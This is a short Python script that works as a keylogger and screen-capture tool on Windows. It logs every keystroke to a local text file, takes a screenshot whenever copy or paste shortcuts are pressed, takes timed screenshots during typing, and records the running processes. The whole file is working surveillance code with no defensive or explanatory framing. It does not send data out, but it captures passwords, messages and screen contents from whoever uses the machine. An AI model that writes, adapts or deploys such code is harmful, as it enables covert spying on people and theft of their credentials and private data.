from pynput.keyboard import Listener
import pyautogui
import datetime
import subprocess

# create folder
def create_folder():
    subprocess.run("mkdir Temp\\Capture", shell=True)
    subprocess.run("mkdir Temp\\Keylogger", shell=True)

# dectect
def detect():
    subprocess.run("tasklist /fi \"STATUS eq RUNNING\" > Temp\\running.txt", shell=True)
    # subprocess.run("netstat -b > Temp\\scan.txt", shell=True)

# keyloger
def keystroke(key):
    key = str(key).replace("'","")
    
    # if key == "Key.backspace":
    #     key = ' ' + key + '\n'
    # if key == "Key.space":
    #     key = ' ' + key + '\n'
    # if key == "Key.enter":
    #     key = ' ' + key + '\n'
    # if key == '\\x01':
    #     key = "\nshortcut All\n"
    #     # capturekey("_Select")    
    if key == "\\x03":
        key = "\nshortcut Copy\n"
        capturekey("_Copy")
    if key == "\\x16":
        key = "\nshortcut Paste\n"
        capturekey("_Paste")
    if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
        key = ''
    else:
        key += ' '
    
    with open("Temp\\Keylogger\\Keylogger.txt", 'a') as f:
        f.write(key)

    time = int(datetime.datetime.now().strftime("%M"))
    if (time % 2 == 0):
        capture()

# capture
def capturekey(k):
    x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
    x += k
    #print(x)
    pyautogui.screenshot().save('Temp\\Capture\\'+ x +'.jpg')    

# capture 
def capture():
    x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M00"))
    x += "_Time"
    #print(x)
    pyautogui.screenshot().save('Temp\\Capture\\'+ x +'.jpg')


#main phase
create_folder()

detect()

# keyloger phase
with Listener(on_press=keystroke) as l:
    l.join()

